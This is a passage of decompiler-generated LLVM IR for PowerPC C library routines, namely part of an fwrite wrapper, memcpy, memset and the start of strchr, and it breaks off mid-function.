  %v4_10009c78 = zext i16 %v3_10009c78 to i32
  store i32 %tmp, i32* @r31, align 4
  store i32 128, i32* @r4, align 4
  store i32 %arg3, i32* @r30, align 4
  %v1_10009c88 = call i32 @__asm_rlwinm(i32 %v4_10009c78, i32 0, i32 24, i32 25)
  %v3_10009c90 = icmp eq i32 %v1_10009c88, 192
  br i1 %v3_10009c90, label %dec_label_pc_10009ca4, label %dec_label_pc_10009c98

dec_label_pc_10009c98:                            ; preds = %entry
  store i32 268475548, i32* @lr, align 4
  %v3_10009c98 = call i32 @__stdio_trans2w_o(i16* nonnull %arg4)
  %v3_10009c9c = icmp eq i32 %v3_10009c98, 0
  br i1 %v3_10009c9c, label %dec_label_pc_10009ca4, label %dec_label_pc_10009cfc

dec_label_pc_10009ca4:                            ; preds = %dec_label_pc_10009c98, %entry
  %v0_10009ca4 = load i32, i32* @r29, align 4
  %v3_10009ca4 = icmp eq i32 %v0_10009ca4, 0
  %v0_10009ca8 = load i32, i32* @r30, align 4
  %v3_10009ca8 = icmp eq i32 %v0_10009ca8, 0
  %brmerge = or i1 %v3_10009ca4, %v3_10009ca8
  br i1 %brmerge, label %dec_label_pc_10009cfc, label %dec_label_pc_10009cb4

dec_label_pc_10009cb4:                            ; preds = %dec_label_pc_10009ca4
  %v2_10009cbc = udiv i32 -1, %v0_10009ca4
  %v0_10009cc0 = load i32, i32* @r31, align 4
  %v3_10009cc4 = icmp ugt i32 %v0_10009ca8, %v2_10009cbc
  %v1_10009cdc = inttoptr i32 %v0_10009cc0 to i16*
  br i1 %v3_10009cc4, label %dec_label_pc_10009cdc, label %dec_label_pc_10009ccc

dec_label_pc_10009ccc:                            ; preds = %dec_label_pc_10009cb4
  %v0_10009cb8 = load i32, i32* @r28, align 4
  %v2_10009ccc = mul i32 %v0_10009ca8, %v0_10009ca4
  store i32 %v2_10009ccc, i32* %r4.global-to-local, align 4
  store i32 268475604, i32* @lr, align 4
  %v5_10009cd0 = call i32 @__stdio_fwrite(i32 %v0_10009cb8, i32 %v2_10009ccc, i16* %v1_10009cdc)
  %v1_10009cd4 = load i32, i32* @r29, align 4
  %v2_10009cd4 = udiv i32 %v5_10009cd0, %v1_10009cd4
  store i32 %v2_10009cd4, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_10009d00

dec_label_pc_10009cdc:                            ; preds = %dec_label_pc_10009cb4
  %v2_10009cdc = load i16, i16* %v1_10009cdc, align 2
  %v1_10009ce0 = or i16 %v2_10009cdc, 8
  store i16 %v1_10009ce0, i16* %v1_10009cdc, align 2
  %v0_10009ce8 = call i32 @__errno_location()
  store i32 0, i32* %r4.global-to-local, align 4
  %v2_10009cf4 = inttoptr i32 %v0_10009ce8 to i32*
  store i32 22, i32* %v2_10009cf4, align 4
  %v0_10009d04.pre = load i32, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_10009d00

dec_label_pc_10009cfc:                            ; preds = %dec_label_pc_10009ca4, %dec_label_pc_10009c98
  store i32 0, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_10009d00

dec_label_pc_10009d00:                            ; preds = %dec_label_pc_10009cdc, %dec_label_pc_10009ccc, %dec_label_pc_10009cfc
  %v0_10009d04 = phi i32 [ %v0_10009d04.pre, %dec_label_pc_10009cdc ], [ %v2_10009cd4, %dec_label_pc_10009ccc ], [ 0, %dec_label_pc_10009cfc ]
  ret i32 %v0_10009d04

; uselistorder directives
  uselistorder i16* %v1_10009cdc, { 1, 2, 0 }
  uselistorder i32* %r4.global-to-local, { 1, 2, 3, 4, 5, 0 }
  uselistorder i32 (i32, i32, i16*)* @__stdio_fwrite, { 1, 2, 3, 5, 6, 0, 4 }
  uselistorder label %dec_label_pc_10009d00, { 2, 0, 1 }
}

define i32 @memcpy() local_unnamed_addr {
entry:
  %ctr.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r9.global-to-local = alloca i32, align 4
  %v0_10009d18 = load i32, i32* @r5, align 4
  %v1_10009d18 = call i32 @__asm_rlwinm.(i32 %v0_10009d18, i32 29, i32 3, i32 31)
  store i32 %v1_10009d18, i32* %r9.global-to-local, align 4
  %v4_10009d18 = icmp eq i32 %v1_10009d18, 0
  %v0_10009d1c = load i32, i32* @r4, align 4
  %v1_10009d1c = add i32 %v0_10009d1c, -4
  store i32 %v1_10009d1c, i32* %r4.global-to-local, align 4
  %v0_10009d20 = load i32, i32* @r3, align 4
  %v1_10009d20 = add i32 %v0_10009d20, -4
  store i32 %v1_10009d20, i32* @r11, align 4
  br i1 %v4_10009d18, label %dec_label_pc_10009d48, label %dec_label_pc_10009d28

dec_label_pc_10009d28:                            ; preds = %entry
  %v1_10009d28 = urem i32 %v1_10009d20, 4
  %v3_10009d28 = icmp eq i32 %v1_10009d28, 0
  br i1 %v3_10009d28, label %dec_label_pc_10009d30, label %dec_label_pc_10009d84

dec_label_pc_10009d30:                            ; preds = %dec_label_pc_10009da4.dec_label_pc_10009d30_crit_edge, %dec_label_pc_10009d28
  %v1_10009d3c.pre = phi i32 [ %v1_10009d20, %dec_label_pc_10009d28 ], [ %v1_10009d3c.pre.pre, %dec_label_pc_10009da4.dec_label_pc_10009d30_crit_edge ]
  %v0_10009d30 = phi i32 [ %v1_10009d18, %dec_label_pc_10009d28 ], [ %v1_10009da4, %dec_label_pc_10009da4.dec_label_pc_10009d30_crit_edge ]
  %.0 = phi i32 [ undef, %dec_label_pc_10009d28 ], [ %v2_10009d8c, %dec_label_pc_10009da4.dec_label_pc_10009d30_crit_edge ]
  store i32 %v0_10009d30, i32* %ctr.global-to-local, align 4
  br label %dec_label_pc_10009d34

dec_label_pc_10009d34:                            ; preds = %dec_label_pc_10009d34, %dec_label_pc_10009d30
  %v1_10009d3c = phi i32 [ %v2_10009d40, %dec_label_pc_10009d34 ], [ %v1_10009d3c.pre, %dec_label_pc_10009d30 ]
  %v0_10009d34 = load i32, i32* %r4.global-to-local, align 4
  %v1_10009d34 = add i32 %v0_10009d34, 4
  %v2_10009d34 = inttoptr i32 %v1_10009d34 to i32*
  %v3_10009d34 = load i32, i32* %v2_10009d34, align 4
  %v1_10009d38 = add i32 %v0_10009d34, 8
  %v2_10009d38 = inttoptr i32 %v1_10009d38 to i32*
  %v3_10009d38 = load i32, i32* %v2_10009d38, align 4
  store i32 %v3_10009d38, i32* %r9.global-to-local, align 4
  store i32 %v1_10009d38, i32* %r4.global-to-local, align 4
  %v2_10009d3c = add i32 %v1_10009d3c, 4
  %v3_10009d3c = inttoptr i32 %v2_10009d3c to i32*
  store i32 %v3_10009d34, i32* %v3_10009d3c, align 4
  %v0_10009d40 = load i32, i32* %r9.global-to-local, align 4
  %v1_10009d40 = load i32, i32* @r11, align 4
  %v2_10009d40 = add i32 %v1_10009d40, 8
  %v3_10009d40 = inttoptr i32 %v2_10009d40 to i32*
  store i32 %v0_10009d40, i32* %v3_10009d40, align 4
  store i32 %v2_10009d40, i32* @r11, align 4
  %v0_10009d44 = load i32, i32* %ctr.global-to-local, align 4
  %v1_10009d44 = add i32 %v0_10009d44, -1
  store i32 %v1_10009d44, i32* %ctr.global-to-local, align 4
  %v2_10009d44 = icmp eq i32 %v1_10009d44, 0
  br i1 %v2_10009d44, label %dec_label_pc_10009d48, label %dec_label_pc_10009d34

dec_label_pc_10009d48:                            ; preds = %dec_label_pc_10009d34, %dec_label_pc_10009da4, %entry
  %.1 = phi i32 [ undef, %entry ], [ %v2_10009d8c, %dec_label_pc_10009da4 ], [ %.0, %dec_label_pc_10009d34 ]
  %v1_10009d48 = urem i32 %.1, 8
  store i32 %v1_10009d48, i32* @r5, align 4
  %tmp = icmp ult i32 %v1_10009d48, 4
  br i1 %tmp, label %dec_label_pc_10009d60, label %dec_label_pc_10009d54

dec_label_pc_10009d54:                            ; preds = %dec_label_pc_10009d48
  %v0_10009d54 = load i32, i32* %r4.global-to-local, align 4
  %v1_10009d54 = add i32 %v0_10009d54, 4
  %v2_10009d54 = inttoptr i32 %v1_10009d54 to i32*
  %v3_10009d54 = load i32, i32* %v2_10009d54, align 4
  store i32 %v1_10009d54, i32* %r4.global-to-local, align 4
  %v1_10009d58 = add nsw i32 %v1_10009d48, -4
  store i32 %v1_10009d58, i32* @r5, align 4
  %v1_10009d5c = load i32, i32* @r11, align 4
  %v2_10009d5c = add i32 %v1_10009d5c, 4
  %v3_10009d5c = inttoptr i32 %v2_10009d5c to i32*
  store i32 %v3_10009d54, i32* %v3_10009d5c, align 4
  store i32 %v2_10009d5c, i32* @r11, align 4
  %v0_10009d60.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_10009d60

dec_label_pc_10009d60:                            ; preds = %dec_label_pc_10009d48, %dec_label_pc_10009d54
  %v0_10009d60 = phi i32 [ %v1_10009d48, %dec_label_pc_10009d48 ], [ %v0_10009d60.pre, %dec_label_pc_10009d54 ]
  %v3_10009d60 = icmp eq i32 %v0_10009d60, 0
  %v0_10009d64 = load i32, i32* @lr, align 4
  call void @__pseudo_cond_branch(i1 %v3_10009d60, i32 %v0_10009d64)
  %v0_10009d68 = load i32, i32* @r5, align 4
  store i32 %v0_10009d68, i32* %ctr.global-to-local, align 4
  %v0_10009d6c = load i32, i32* %r4.global-to-local, align 4
  %v1_10009d6c = add i32 %v0_10009d6c, 3
  store i32 %v1_10009d6c, i32* %r4.global-to-local, align 4
  %v0_10009d70 = load i32, i32* @r11, align 4
  %v1_10009d70 = add i32 %v0_10009d70, 3
  store i32 %v1_10009d70, i32* %r9.global-to-local, align 4
  %v1_10009d749 = add i32 %v0_10009d6c, 4
  %v2_10009d7410 = inttoptr i32 %v1_10009d749 to i8*
  %v3_10009d7411 = load i8, i8* %v2_10009d7410, align 1
  store i32 %v1_10009d749, i32* %r4.global-to-local, align 4
  %v3_10009d7813 = add i32 %v0_10009d70, 4
  %v4_10009d7814 = inttoptr i32 %v3_10009d7813 to i8*
  store i8 %v3_10009d7411, i8* %v4_10009d7814, align 1
  store i32 %v3_10009d7813, i32* %r9.global-to-local, align 4
  %v0_10009d7c15 = load i32, i32* %ctr.global-to-local, align 4
  %v1_10009d7c16 = add i32 %v0_10009d7c15, -1
  store i32 %v1_10009d7c16, i32* %ctr.global-to-local, align 4
  %v2_10009d7c17 = icmp eq i32 %v1_10009d7c16, 0
  br i1 %v2_10009d7c17, label %dec_label_pc_10009db0, label %dec_label_pc_10009d74.dec_label_pc_10009d74_crit_edge

dec_label_pc_10009d74.dec_label_pc_10009d74_crit_edge: ; preds = %dec_label_pc_10009d60, %dec_label_pc_10009d74.dec_label_pc_10009d74_crit_edge
  %v3_10009d7818 = phi i32 [ %v3_10009d78, %dec_label_pc_10009d74.dec_label_pc_10009d74_crit_edge ], [ %v3_10009d7813, %dec_label_pc_10009d60 ]
  %v0_10009d74.pre = load i32, i32* %r4.global-to-local, align 4
  %v1_10009d74 = add i32 %v0_10009d74.pre, 1
  %v2_10009d74 = inttoptr i32 %v1_10009d74 to i8*
  %v3_10009d74 = load i8, i8* %v2_10009d74, align 1
  store i32 %v1_10009d74, i32* %r4.global-to-local, align 4
  %v3_10009d78 = add i32 %v3_10009d7818, 1
  %v4_10009d78 = inttoptr i32 %v3_10009d78 to i8*
  store i8 %v3_10009d74, i8* %v4_10009d78, align 1
  store i32 %v3_10009d78, i32* %r9.global-to-local, align 4
  %v0_10009d7c = load i32, i32* %ctr.global-to-local, align 4
  %v1_10009d7c = add i32 %v0_10009d7c, -1
  store i32 %v1_10009d7c, i32* %ctr.global-to-local, align 4
  %v2_10009d7c = icmp eq i32 %v1_10009d7c, 0
  br i1 %v2_10009d7c, label %dec_label_pc_10009db0, label %dec_label_pc_10009d74.dec_label_pc_10009d74_crit_edge

dec_label_pc_10009d84:                            ; preds = %dec_label_pc_10009d28
  %v1_10009d84 = sub nsw i32 4, %v1_10009d28
  store i32 %v1_10009d84, i32* %ctr.global-to-local, align 4
  %v1_10009d8c = load i32, i32* @r5, align 4
  %v2_10009d8c = sub i32 %v1_10009d8c, %v1_10009d84
  br label %dec_label_pc_10009d90

dec_label_pc_10009d90:                            ; preds = %dec_label_pc_10009d90.dec_label_pc_10009d90_crit_edge, %dec_label_pc_10009d84
  %v2_10009d98 = phi i32 [ %v1_10009d9c, %dec_label_pc_10009d90.dec_label_pc_10009d90_crit_edge ], [ %v1_10009d20, %dec_label_pc_10009d84 ]
  %v0_10009d90 = phi i32 [ %v0_10009d90.pre, %dec_label_pc_10009d90.dec_label_pc_10009d90_crit_edge ], [ %v1_10009d1c, %dec_label_pc_10009d84 ]
  %v1_10009d90 = add i32 %v0_10009d90, 4
  %v2_10009d90 = inttoptr i32 %v1_10009d90 to i8*
  %v3_10009d90 = load i8, i8* %v2_10009d90, align 1
  %v1_10009d94 = add i32 %v0_10009d90, 1
  store i32 %v1_10009d94, i32* %r4.global-to-local, align 4
  %v3_10009d98 = add i32 %v2_10009d98, 4
  %v4_10009d98 = inttoptr i32 %v3_10009d98 to i8*
  store i8 %v3_10009d90, i8* %v4_10009d98, align 1
  %v0_10009d9c = load i32, i32* @r11, align 4
  %v1_10009d9c = add i32 %v0_10009d9c, 1
  store i32 %v1_10009d9c, i32* @r11, align 4
  %v0_10009da0 = load i32, i32* %ctr.global-to-local, align 4
  %v1_10009da0 = add i32 %v0_10009da0, -1
  store i32 %v1_10009da0, i32* %ctr.global-to-local, align 4
  %v2_10009da0 = icmp eq i32 %v1_10009da0, 0
  br i1 %v2_10009da0, label %dec_label_pc_10009da4, label %dec_label_pc_10009d90.dec_label_pc_10009d90_crit_edge

dec_label_pc_10009d90.dec_label_pc_10009d90_crit_edge: ; preds = %dec_label_pc_10009d90
  %v0_10009d90.pre = load i32, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_10009d90

dec_label_pc_10009da4:                            ; preds = %dec_label_pc_10009d90
  %v1_10009da4 = call i32 @__asm_rlwinm.(i32 %v2_10009d8c, i32 29, i32 3, i32 31)
  store i32 %v1_10009da4, i32* %r9.global-to-local, align 4
  %v4_10009da4 = icmp eq i32 %v1_10009da4, 0
  br i1 %v4_10009da4, label %dec_label_pc_10009d48, label %dec_label_pc_10009da4.dec_label_pc_10009d30_crit_edge

dec_label_pc_10009da4.dec_label_pc_10009d30_crit_edge: ; preds = %dec_label_pc_10009da4
  %v1_10009d3c.pre.pre = load i32, i32* @r11, align 4
  br label %dec_label_pc_10009d30

dec_label_pc_10009db0:                            ; preds = %dec_label_pc_10009d74.dec_label_pc_10009d74_crit_edge, %dec_label_pc_10009d60
  %v0_10009db0 = load i32, i32* @r3, align 4
  ret i32 %v0_10009db0

; uselistorder directives
  uselistorder i32 %v1_10009da4, { 1, 2, 0 }
  uselistorder i32 %v1_10009da0, { 1, 0 }
  uselistorder i32 %v1_10009d9c, { 1, 0 }
  uselistorder i32 %v0_10009d90, { 1, 0 }
  uselistorder i32 %v2_10009d8c, { 2, 1, 0 }
  uselistorder i32 %v1_10009d7c, { 1, 0 }
  uselistorder i32 %v3_10009d78, { 1, 2, 0 }
  uselistorder i32 %v1_10009d48, { 3, 2, 1, 0 }
  uselistorder i32 %v1_10009d44, { 1, 0 }
  uselistorder i32 %v2_10009d40, { 1, 2, 0 }
  uselistorder i32 %v1_10009d28, { 1, 0 }
  uselistorder i32 %v1_10009d20, { 2, 1, 0, 3 }
  uselistorder i32* %r9.global-to-local, { 1, 2, 0, 3, 4, 5, 6 }
  uselistorder i32* %r4.global-to-local, { 1, 2, 4, 3, 0, 5, 8, 6, 10, 7, 9, 11 }
  uselistorder i32* %ctr.global-to-local, { 1, 2, 3, 5, 4, 0, 6, 7, 8, 9, 10 }
  uselistorder label %dec_label_pc_10009d74.dec_label_pc_10009d74_crit_edge, { 1, 0 }
  uselistorder label %dec_label_pc_10009d60, { 1, 0 }
  uselistorder label %dec_label_pc_10009d48, { 1, 0, 2 }
}

define i32 @__GI_memset(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %cr0_eq.global-to-local = alloca i1, align 1
  %ctr.global-to-local = alloca i32, align 4
  %r11.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r9.global-to-local = alloca i32, align 4
  store i32 %arg3, i32* %r5.global-to-local, align 4
  %v1_10009db4 = call i32 @__asm_rlwinm.(i32 %arg3, i32 29, i32 3, i32 31)
  store i32 %v1_10009db4, i32* %r9.global-to-local, align 4
  %v4_10009db4 = icmp eq i32 %v1_10009db4, 0
  store i1 %v4_10009db4, i1* %cr0_eq.global-to-local, align 1
  store i1 false, i1* @cr0_so, align 1
  %v1_10009dbc = add i32 %arg1, -4
  store i32 %v1_10009dbc, i32* %r11.global-to-local, align 4
  %v1_10009dc0 = call i32 @__asm_rlwimi(i32 %arg2, i32 8, i32 16, i32 23)
  %v1_10009dc4 = call i32 @__asm_rlwimi(i32 %v1_10009dc0, i32 16, i32 0, i32 15)
  %v2_10009dc4 = trunc i32 %v1_10009dc4 to i8
  %v0_10009dc8 = load i1, i1* %cr0_eq.global-to-local, align 1
  br i1 %v0_10009dc8, label %dec_label_pc_10009dec, label %dec_label_pc_10009dcc

dec_label_pc_10009dcc:                            ; preds = %entry
  %v0_10009dcc = load i32, i32* %r11.global-to-local, align 4
  %v1_10009dcc = urem i32 %v0_10009dcc, 4
  %v3_10009dcc = icmp eq i32 %v1_10009dcc, 0
  store i1 %v3_10009dcc, i1* %cr0_eq.global-to-local, align 1
  store i1 false, i1* @cr0_so, align 1
  br i1 %v3_10009dcc, label %dec_label_pc_10009dcc.dec_label_pc_10009dd4_crit_edge, label %dec_label_pc_10009e1c

dec_label_pc_10009dcc.dec_label_pc_10009dd4_crit_edge: ; preds = %dec_label_pc_10009dcc
  %v0_10009dd4.pre = load i32, i32* %r9.global-to-local, align 4
  br label %dec_label_pc_10009dd4

dec_label_pc_10009dd4:                            ; preds = %dec_label_pc_10009e34.dec_label_pc_10009dd4_crit_edge, %dec_label_pc_10009dcc.dec_label_pc_10009dd4_crit_edge
  %v0_10009dd8.pre = phi i32 [ %v0_10009dcc, %dec_label_pc_10009dcc.dec_label_pc_10009dd4_crit_edge ], [ %v0_10009dd8.pre.pre, %dec_label_pc_10009e34.dec_label_pc_10009dd4_crit_edge ]
  %v0_10009dd4 = phi i32 [ %v0_10009dd4.pre, %dec_label_pc_10009dcc.dec_label_pc_10009dd4_crit_edge ], [ %v1_10009e34, %dec_label_pc_10009e34.dec_label_pc_10009dd4_crit_edge ]
  store i32 %v0_10009dd4, i32* %ctr.global-to-local, align 4
  %v1_10009ddc = sext i8 %v2_10009dc4 to i32
  br label %dec_label_pc_10009dd8

dec_label_pc_10009dd8:                            ; preds = %dec_label_pc_10009dd8, %dec_label_pc_10009dd4
  %v0_10009dd8 = phi i32 [ %v1_10009de4, %dec_label_pc_10009dd8 ], [ %v0_10009dd8.pre, %dec_label_pc_10009dd4 ]
  %v1_10009dd8 = add i32 %v0_10009dd8, 4
  store i32 %v1_10009dd8, i32* %r9.global-to-local, align 4
  %v4_10009ddc = inttoptr i32 %v1_10009dd8 to i32*
  store i32 %v1_10009ddc, i32* %v4_10009ddc, align 4
  %v2_10009de0 = load i32, i32* %r9.global-to-local, align 4
  %v3_10009de0 = add i32 %v2_10009de0, 4
  %v4_10009de0 = inttoptr i32 %v3_10009de0 to i32*
  store i32 %v1_10009ddc, i32* %v4_10009de0, align 4
  %v0_10009de4 = load i32, i32* %r9.global-to-local, align 4
  %v1_10009de4 = add i32 %v0_10009de4, 4
  store i32 %v1_10009de4, i32* %r11.global-to-local, align 4
  %v0_10009de8 = load i32, i32* %ctr.global-to-local, align 4
  %v1_10009de8 = add i32 %v0_10009de8, -1
  store i32 %v1_10009de8, i32* %ctr.global-to-local, align 4
  %v2_10009de8 = icmp eq i32 %v1_10009de8, 0
  br i1 %v2_10009de8, label %dec_label_pc_10009dec, label %dec_label_pc_10009dd8

dec_label_pc_10009dec:                            ; preds = %dec_label_pc_10009dd8, %dec_label_pc_10009e34, %entry
  %v0_10009dec = load i32, i32* %r5.global-to-local, align 4
  %v1_10009dec = urem i32 %v0_10009dec, 8
  store i32 %v1_10009dec, i32* @r5, align 4
  %tmp = icmp ult i32 %v1_10009dec, 4
  br i1 %tmp, label %dec_label_pc_10009e00, label %dec_label_pc_10009df8

dec_label_pc_10009df8:                            ; preds = %dec_label_pc_10009dec
  %v1_10009df8 = sext i8 %v2_10009dc4 to i32
  %v2_10009df8 = load i32, i32* %r11.global-to-local, align 4
  %v3_10009df8 = add i32 %v2_10009df8, 4
  %v4_10009df8 = inttoptr i32 %v3_10009df8 to i32*
  store i32 %v1_10009df8, i32* %v4_10009df8, align 4
  store i32 %v3_10009df8, i32* %r11.global-to-local, align 4
  %v0_10009dfc = load i32, i32* @r5, align 4
  %v1_10009dfc = add i32 %v0_10009dfc, -4
  store i32 %v1_10009dfc, i32* @r5, align 4
  br label %dec_label_pc_10009e00

dec_label_pc_10009e00:                            ; preds = %dec_label_pc_10009dec, %dec_label_pc_10009df8
  %v0_10009e00 = phi i32 [ %v1_10009dec, %dec_label_pc_10009dec ], [ %v1_10009dfc, %dec_label_pc_10009df8 ]
  %v3_10009e00 = icmp eq i32 %v0_10009e00, 0
  %v0_10009e04 = load i32, i32* @lr, align 4
  call void @__pseudo_cond_branch(i1 %v3_10009e00, i32 %v0_10009e04)
  %v0_10009e08 = load i32, i32* @r5, align 4
  store i32 %v0_10009e08, i32* %ctr.global-to-local, align 4
  %v0_10009e0c = load i32, i32* %r11.global-to-local, align 4
  %v1_10009e0c = add i32 %v0_10009e0c, 3
  store i32 %v1_10009e0c, i32* %r9.global-to-local, align 4
  br label %dec_label_pc_10009e10

dec_label_pc_10009e10:                            ; preds = %dec_label_pc_10009e10, %dec_label_pc_10009e00
  %v3_10009e10 = phi i32 [ %v4_10009e10, %dec_label_pc_10009e10 ], [ %v1_10009e0c, %dec_label_pc_10009e00 ]
  %v4_10009e10 = add i32 %v3_10009e10, 1
  %v5_10009e10 = inttoptr i32 %v4_10009e10 to i8*
  store i8 %v2_10009dc4, i8* %v5_10009e10, align 1
  store i32 %v4_10009e10, i32* %r9.global-to-local, align 4
  %v0_10009e14 = load i32, i32* %ctr.global-to-local, align 4
  %v1_10009e14 = add i32 %v0_10009e14, -1
  store i32 %v1_10009e14, i32* %ctr.global-to-local, align 4
  %v2_10009e14 = icmp eq i32 %v1_10009e14, 0
  br i1 %v2_10009e14, label %dec_label_pc_10009e40, label %dec_label_pc_10009e10

dec_label_pc_10009e1c:                            ; preds = %dec_label_pc_10009dcc
  %v1_10009e1c = sub nsw i32 4, %v1_10009dcc
  store i32 %v1_10009e1c, i32* %ctr.global-to-local, align 4
  %v1_10009e24 = load i32, i32* %r5.global-to-local, align 4
  %v2_10009e24 = sub i32 %v1_10009e24, %v1_10009e1c
  store i32 %v2_10009e24, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_10009e28

dec_label_pc_10009e28:                            ; preds = %dec_label_pc_10009e28, %dec_label_pc_10009e1c
  %v3_10009e28 = phi i32 [ %v1_10009e2c, %dec_label_pc_10009e28 ], [ %v0_10009dcc, %dec_label_pc_10009e1c ]
  %v4_10009e28 = add i32 %v3_10009e28, 4
  %v5_10009e28 = inttoptr i32 %v4_10009e28 to i8*
  store i8 %v2_10009dc4, i8* %v5_10009e28, align 1
  %v0_10009e2c = load i32, i32* %r11.global-to-local, align 4
  %v1_10009e2c = add i32 %v0_10009e2c, 1
  store i32 %v1_10009e2c, i32* %r11.global-to-local, align 4
  %v0_10009e30 = load i32, i32* %ctr.global-to-local, align 4
  %v1_10009e30 = add i32 %v0_10009e30, -1
  store i32 %v1_10009e30, i32* %ctr.global-to-local, align 4
  %v2_10009e30 = icmp eq i32 %v1_10009e30, 0
  br i1 %v2_10009e30, label %dec_label_pc_10009e34, label %dec_label_pc_10009e28

dec_label_pc_10009e34:                            ; preds = %dec_label_pc_10009e28
  %v0_10009e34 = load i32, i32* %r5.global-to-local, align 4
  %v1_10009e34 = call i32 @__asm_rlwinm.(i32 %v0_10009e34, i32 29, i32 3, i32 31)
  store i32 %v1_10009e34, i32* %r9.global-to-local, align 4
  %v4_10009e34 = icmp eq i32 %v1_10009e34, 0
  store i1 %v4_10009e34, i1* %cr0_eq.global-to-local, align 1
  store i1 false, i1* @cr0_so, align 1
  br i1 %v4_10009e34, label %dec_label_pc_10009dec, label %dec_label_pc_10009e34.dec_label_pc_10009dd4_crit_edge

dec_label_pc_10009e34.dec_label_pc_10009dd4_crit_edge: ; preds = %dec_label_pc_10009e34
  %v0_10009dd8.pre.pre = load i32, i32* %r11.global-to-local, align 4
  br label %dec_label_pc_10009dd4

dec_label_pc_10009e40:                            ; preds = %dec_label_pc_10009e10
  ret i32 %arg1

; uselistorder directives
  uselistorder i32 %v1_10009e34, { 1, 2, 0 }
  uselistorder i32 %v1_10009e30, { 1, 0 }
  uselistorder i32 %v1_10009e2c, { 1, 0 }
  uselistorder i32 %v1_10009e14, { 1, 0 }
  uselistorder i32 %v4_10009e10, { 1, 2, 0 }
  uselistorder i32 %v1_10009dec, { 2, 1, 0 }
  uselistorder i32 %v1_10009de8, { 1, 0 }
  uselistorder i32 %v1_10009de4, { 1, 0 }
  uselistorder i32 %v1_10009dcc, { 1, 0 }
  uselistorder i32 %v0_10009dcc, { 2, 1, 0 }
  uselistorder i8 %v2_10009dc4, { 3, 0, 2, 1 }
  uselistorder i32* %r5.global-to-local, { 2, 4, 0, 3, 1 }
  uselistorder i32* %r11.global-to-local, { 0, 1, 4, 5, 2, 6, 3, 7, 8 }
  uselistorder i32 (i32, i32, i32, i32)* @__asm_rlwimi, { 3, 4, 0, 1, 2 }
  uselistorder i1* @cr0_so, { 2, 3, 4, 0, 1 }
  uselistorder label %dec_label_pc_10009e00, { 1, 0 }
  uselistorder label %dec_label_pc_10009dec, { 1, 0, 2 }
}

define i32 @__GI_strchr(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r4.global-to-local = alloca i32, align 4
  %v1_10009e44 = urem i32 %arg1, 256
  store i32 %v1_10009e44, i32* %r4.global-to-local, align 4
  %v0_10009e642 = load i32, i32* @r3, align 4
  %v1_10009e643 = urem i32 %v0_10009e642, 4
  %v3_10009e645 = icmp eq i32 %v1_10009e643, 0
  br i1 %v3_10009e645, label %dec_label_pc_10009e6c, label %dec_label_pc_10009e4c

dec_label_pc_10009e4c:                            ; preds = %entry, %dec_label_pc_10009e60
  %v1_10009e50 = phi i32 [ %v0_10009e6c.pre, %dec_label_pc_10009e60 ], [ %v1_10009e44, %entry ]
  %v0_10009e4c = phi i32 [ %v1_10009e60, %dec_label_pc_10009e60 ], [ %v0_10009e642, %entry ]
  %v1_10009e4c = inttoptr i32 %v0_10009e4c to i8*
  %v2_10009e4c = load i8, i8* %v1_10009e4c, align 1
  %v3_10009e4c = zext i8 %v2_10009e4c to i32
  %v4_10009e50 = icmp eq i32 %v3_10009e4c, %v1_10009e50
  %v3_10009e54 = icmp eq i8 %v2_10009e4c, 0
  %v0_10009e58 = load i32, i32* @lr, align 4
  call void @__pseudo_cond_branch(i1 %v4_10009e50, i32 %v0_10009e58)
  br i1 %v3_10009e54, label %dec_label_pc_10009f3c, label %dec_label_pc_10009e60

dec_label_pc_10009e60:                            ; preds = %dec_label_pc_10009e4c
  %v0_10009e60 = load i32, i32* @r3, align 4
  %v1_10009e60 = add i32 %v0_10009e60, 1
  store i32 %v1_10009e60, i32* @r3, align 4
  %v1_10009e64 = urem i32 %v1_10009e60, 4
  %v3_10009e64 = icmp eq i32 %v1_10009e64, 0
  %v0_10009e6c.pre = load i32, i32* %r4.global-to-local, align 4
  br i1 %v3_10009e64, label %dec_label_pc_10009e6c, label %dec_label_pc_10009e4c

dec_label_pc_10009e6c:                            ; preds = %dec_label_pc_10009e60, %entry
  %v0_10009e8410 = phi i32 [ %v0_10009e642, %entry ], [ %v1_10009e60, %dec_label_pc_10009e60 ]
  %v0_10009e6c = phi i32 [ %v1_10009e44, %entry ], [ %v0_10009e6c.pre, %dec_label_pc_10009e60 ]
  %v1_10009e6c = mul i32 %v0_10009e6c, 256
  %v2_10009e74 = or i32 %v1_10009e6c, %v0_10009e6c
  %v1_10009e7c = mul i32 %v2_10009e74, 65536
  %v2_10009e80 = or i32 %v1_10009e7c, %v2_10009e74
  br label %dec_label_pc_10009e84

dec_label_pc_10009e84:                            ; preds = %dec_label_pc_10009e84, %dec_label_pc_10009f38, %dec_label_pc_10009e6c
  %v0_10009edc = phi i32 [ %v0_10009e8410, %dec_label_pc_10009e6c ], [ %v1_10009e88, %dec_label_pc_10009f38 ], [ %v1_10009e88, %dec_label_pc_10009e84 ]
  %v1_10009e84 = inttoptr i32 %v0_10009edc to i32*
  %v2_10009e84 = load i32, i32* %v1_10009e84, align 4
  %v1_10009e88 = add i32 %v0_10009edc, 4
  %v2_10009e90 = xor i32 %v2_10009e84, %v2_10009e80
  %v1_10009e94 = add i32 %v2_10009e84, 2130640639
  %v2_10009e9c = xor i32 %v1_10009e94, %v2_10009e84
  %v1_10009ea0 = add i32 %v2_10009e90, 2130640639
  %v2_10009ea4 = and i32 %v2_10009e9c, -2130640640
  %v3_10009ea4 = xor i32 %v2_10009ea4, -2130640640
  %v2_10009ea8 = xor i32 %v1_10009ea0, %v2_10009e90
  %v2_10009eac = and i32 %v2_10009ea8, -2130640640
  %v3_10009eac = xor i32 %v2_10009eac, -2130640640
  %v1_10009eb8 = add i32 %v0_10009edc, 1
  %tmp = or i32 %v3_10009eac, %v3_10009ea4
  %brmerge = icmp eq i32 %tmp, 0
  br i1 %brmerge, label %dec_label_pc_10009e84, label %dec_label_pc_10009ec4

dec_label_pc_10009ec4:                            ; preds = %dec_label_pc_10009e84
